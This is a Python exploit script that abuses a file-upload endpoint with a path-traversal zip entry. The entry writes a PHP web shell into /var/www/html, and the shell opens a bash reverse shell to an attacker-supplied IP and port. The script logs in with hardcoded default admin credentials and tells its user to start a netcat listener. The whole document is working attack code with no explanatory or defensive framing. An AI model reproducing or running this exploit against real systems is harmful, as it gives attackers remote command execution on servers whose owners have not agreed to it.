import zipfile, requests, argparse

parser = argparse.ArgumentParser()
parser.add_argument('--target', '-t', dest='target', help='Target Machine', required=True)
parser.add_argument('--ip', '-i', dest='ip', help='IP Attacker', required=True)
parser.add_argument('--port', '-po', dest='port', help='Port Listening', required=True)
args = parser.parse_args()

target = args.target
ip = args.ip
port = args.port
upload_url = f"http://{target}/upload"
http_proxy = {'http':'http://127.0.0.1:8080'}

def build_zip():
    zip_file_path = 'bad.zip'
    with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zip_file:
        php_code = f"""<?php exec("/bin/bash -c 'bash -i > /dev/tcp/{ip}/{port} 0>&1'");"""
        zip_file.writestr('../../../../../../../../var/www/html/shell.php', php_code)

def upload_zip():
    boundary = "---------------------------ardias"
    header = {'Content-Type':f'multipart/form-data; boundary={boundary}', 'Authorization':'Basic YWRtaW46YWRtaW4='}
    payload = f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"bad.zip\"\r\nContent-Type: application/zip\r\n\r\n"
    with open('bad.zip', 'rb') as f:
        payload += f.read().decode('latin1')
    payload += f"\r\n--{boundary}--\r\n"
    r = requests.post(url=upload_url, headers=header, data=payload, proxies=http_proxy)
    if 'File Uploaded Successfully' in r.text:
        print(f"[+] Shell success uploaded\nYou can access here http://{target}/shell.php")

build_zip()
upload_zip()
print(f"[+] Don't forget to start netcat listener to port {port}")